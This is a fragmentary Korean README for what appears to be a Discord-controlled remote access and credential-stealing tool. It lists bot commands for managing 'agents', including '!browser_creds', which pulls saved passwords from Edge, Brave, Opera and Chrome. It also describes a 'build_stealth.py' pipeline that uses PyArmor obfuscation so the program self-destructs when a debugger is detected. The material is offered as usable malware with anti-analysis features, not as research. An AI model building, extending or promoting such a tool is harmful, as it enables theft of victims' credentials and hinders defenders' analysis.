...
- 🎛️ **Discord UI Dashboard**: 명령어 암기 필요 없는 대화형 클릭 버튼 제어판 지원
...
단순 PyInstaller 빌드 외에 리버스 엔지니어링을 막기 위해 2단계 빌드 파이프라인을 지원합니다.
빌더 스크립트에서 **[2] PyArmor JIT Obfuscation** 옵션을 선택하면 소스코드가 메모리에서만 복호화되며 디버거 감지 시 프로그램이 자폭합니다.
```bash
python build_stealth.py
# 프롬프트에서 [3] Code Protection -> [2] 선택 시 자동 적용
```
...
```text
# === 기본 정보 및 UI ===
!panel (또는 !menu)        # 🎛️ 대화형 UI 컨트롤 패널 열기 (버튼 클릭 제어)
!agents                    # 에이전트 목록
!ping                      # 연결 테스트  
!status                    # 상태 확인
!sysinfo                   # 시스템 정보
...
!browser_creds            # 브라우저 비밀번호 (Edge/Brave/Opera/Chrome v10)
...
└── modules/
    ...
    ├── ui_dashboard.py            # 🎛️ Discord 버튼/메뉴 대화형 UI
